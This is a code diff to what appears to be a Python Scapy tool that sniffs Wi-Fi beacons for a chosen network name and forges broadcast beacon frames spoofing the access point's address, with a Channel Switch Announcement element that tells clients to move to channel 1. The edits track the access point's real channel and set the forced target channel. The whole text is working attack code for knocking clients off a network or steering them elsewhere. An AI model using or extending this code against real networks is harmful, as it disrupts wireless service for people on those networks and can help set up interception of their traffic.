@@ -48,7 +48,7 @@ def stop_filter_beacon(packet):
 		dot11 = packet.getlayer(Dot11)
 		beacon = packet.getlayer(Dot11Beacon)
 		if bytes(parser.ssid,'utf-8') == elt.info and dot11.addr3 not in mac_list:
-			print("\t"+INFO_STR+" Access Point MAC Address (BSSID) : %s" % dot11.addr3)
+			
 			mac_list.append(dot11.addr3)
 			make_beacon_csa(parser, elt, dot11)
 
@@ -58,16 +58,21 @@ def make_beacon_csa(parser, elt, dot11):
 	dot11_beacon = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2=dot11.addr3, addr3=dot11.addr3)
 	beacon = Dot11Beacon(cap=0o411)
 	frame = RadioTap()/dot11_beacon/beacon
-	csa = Dot11Elt(ID=0x25,len=3,info=bytes([0,161,1]))
+	csa = Dot11Elt(ID=0x25,len=3,info=bytes([0,1,1]))
 	flag = False
+	tmp_ch = cur_channel
 	while elt != None:
+		if elt.ID == 3:
+			if elt.channel != cur_channel:
+				tmp_ch = elt.channel
 		if elt.ID > 37 and flag == False:
 			flag = True
 			frame = frame/csa
 		information_element = Dot11Elt(ID=elt.ID, len=len(elt.info), info=elt.info)
 		frame = frame/information_element
 		elt = elt.payload.getlayer(Dot11Elt)
-	csa_packets.append((cur_channel, frame))
+	csa_packets.append((tmp_ch, frame))
+	print(f"\t {INFO_STR} Access Point MAC Address (BSSID) : {dot11.addr3} {tmp_ch}")
 
 def send_beacon_csa(parser):
 	try:
